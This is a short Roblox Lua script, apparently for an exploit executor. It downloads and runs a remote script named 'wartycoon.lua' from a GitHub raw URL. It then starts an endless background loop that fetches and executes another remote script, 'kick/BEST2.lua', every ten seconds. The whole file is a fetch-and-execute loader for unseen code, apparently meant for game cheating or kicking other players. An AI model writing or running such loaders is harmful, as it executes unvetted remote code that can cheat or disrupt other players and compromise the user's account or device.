loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/wartycoon/refs/heads/main/wartycoon.lua", true ))()
local function backgroundLoop()
    while true do
        loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/kick/refs/heads/main/BEST2.lua", true ))()
        task.wait(10)
    end
end
spawn(backgroundLoop)
